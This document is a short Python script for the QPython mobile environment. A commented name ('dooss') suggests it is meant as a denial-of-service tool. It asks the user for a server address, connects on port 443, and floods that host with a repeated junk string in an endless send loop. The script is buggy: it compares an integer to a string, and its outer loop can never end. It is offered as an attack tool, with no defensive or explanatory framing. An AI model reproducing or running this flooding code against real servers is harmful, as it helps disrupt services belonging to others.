#-*-coding:utf8;-*-
#qpy:3
#qpy:console
import socket
import time
from socket import socket , AF_INET , SOCK_STREAM
#def dooss(ip)
ad = input("entre server site :")
s = socket(AF_INET, SOCK_STREAM)
s.connect((ad,443))
d = 100
a = 0
while d != 1500 :
    ry = ["ghfdv12hgdgtrfed3w0?#wxrzsqpoui5 $3!GFHJHLOPNBVCSDFGHHKKMztrtuyuoiupouizserhyuyuiiuhjhfddfdqxwxccv8*76/$@hswbmp42@^^$#42fshuij"]
    for i in ry :
        a = a + 1
        i = str(i).encode("utf-8")
        s.send(i)
        print("data send....", i)
        if a == "6897096500" :
            time.sleep(.001)
            a = 0
            print("snd", a)
        while a >= 20000 :
            time.sleep(.001)
            i = str(i).encode("utf-8")
            s.send(i)
            print("data sending....", i)
            a = 0
            
